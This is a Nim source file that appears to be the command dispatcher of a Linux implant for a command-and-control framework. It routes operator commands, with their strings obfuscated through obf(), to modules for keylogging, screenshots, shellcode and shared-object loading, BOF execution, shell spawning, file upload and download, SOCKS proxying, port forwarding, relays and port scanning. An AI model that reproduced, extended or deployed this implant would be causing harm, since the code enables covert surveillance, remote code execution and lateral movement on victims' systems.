import ../utils/global
import ../utils/linapi/handlers
import tasks as taskcmds
import filesystem
import fileinfo
import acl
import preview
import download
import upload
import screenshots
import keylogger
import general
import execution
import load_so
import shell
import spawn
import relay/core as relay
import relay/tcp
import search
import folders as foldersCmd
import files as filesCmd
import process as processCmd
import socks as socksCmd
import portforward as portforwardCmd
import portscan/core as portscan


proc run*(cmdType, mode, raw, args, input, params, host, taskTag: string; buf: var openArray[char]): int =
  # Here is where the command is dispatched to the matching capability
  if cmdType == obf("folders"): foldersCmd.run(host, taskTag, input, params, buf)
  elif cmdType == obf("files"): filesCmd.run(host, taskTag, input, params, buf)
  elif cmdType == obf("process"): processCmd.run(host, taskTag, input, params, buf)
  elif cmdType == obf("socks"): socksCmd.run(host, taskTag, input, params, buf)
  elif cmdType == obf("port_forwarding"): portforwardCmd.run(host, taskTag, input, params, buf)
  elif mode == obf("ls"): filesystem.run_ls(args, buf)
  elif mode == obf("cd"): filesystem.run_cd(args, buf)
  elif mode == obf("pwd"): filesystem.run_pwd(buf)
  elif mode == obf("mkdir"): filesystem.run_mkdir(args, buf)
  elif mode == obf("rmdir"): filesystem.run_rmdir(args, buf)
  elif mode == obf("rm"): filesystem.run_del(args, buf)
  elif mode == obf("cp"): filesystem.run_copy(args, buf)
  elif mode == obf("mv"): filesystem.run_move(args, buf)
  elif mode == obf("ren"): filesystem.run_ren(args, buf)
  elif mode == obf("cat"): filesystem.run_cat(args, buf)
  elif mode == obf("preview"): preview.run_preview(args, params, buf)
  elif mode == obf("fileinfo"): fileinfo.run_fileinfo(args, buf)
  elif mode == obf("acl"): acl.run_acl(args, buf)
  elif mode == obf("upload"): upload.run_upload(input, params, buf)
  elif mode == obf("download"): download.run_download(input, params, taskTag, buf)
  elif mode == obf("search"): search.run_search(args, input, params, buf)
  elif mode == obf("echo"): filesystem.run_echo(args, buf)
  elif mode == obf("attrib"): filesystem.run_attrib(args, buf)
  elif mode == obf("set"): filesystem.run_set(args, buf)
  elif raw == obf("whoami"): filesystem.run_whoami(args, buf)
  elif raw == obf("env"): filesystem.run_env(args, buf)
  elif raw == obf("tasklist"): filesystem.run_tasklist(args, buf)
  elif raw == obf("ifconfig"): filesystem.run_ifconfig(args, buf)
  elif raw == obf("netstat"): filesystem.run_netstat(args, buf)
  elif mode == obf("portscan"): portscan.run_portscan(args, params, buf)
  elif mode == obf("config"): general.run_config(args, buf)
  elif mode == obf("delay"): general.run_delay(args, buf)
  elif mode == obf("shell"): shell.run_shell(args, buf)
  elif mode == obf("spawn"): spawn.run_spawn(params, buf)
  elif mode == obf("shellcode"): run_shellcode(input, params, buf, skShellcode)
  elif mode == obf("load-so"): load_so.run_load_so(input, params, buf)
  elif mode == obf("bof") or mode == obf("bof_armory"): run_bof(input, params, buf)
  elif mode == obf("screenshot"): screenshots.run_screenshot(params, buf)
  elif mode == obf("screenshot start"): screenshots.run_screenshot_start(params, buf)
  elif mode == obf("screenshot stop"): screenshots.run_screenshot_stop(params, buf)
  elif mode == obf("keylogger start"): keylogger.run_keylogger_start(params, buf)
  elif mode == obf("keylogger stop"): keylogger.run_keylogger_stop(params, buf)
  elif mode == obf("tasks"): taskcmds.run_list(buf)
  elif mode == obf("tasks kill"): taskcmds.run_kill(params, buf)
  elif mode == obf("relay"): relay.run_relay(params, buf)
  elif mode == obf("relay create"): relay.run_relay_create(params, buf)
  elif mode == obf("relay delete"): relay.run_relay_delete(params, buf)
  elif mode == obf("kill"):
    quit(0)
  else:
    let unknown = obf("Unknown command")
    if unknown.len > buf.len: return -1
    for i, c in unknown: buf[i] = c
    unknown.len
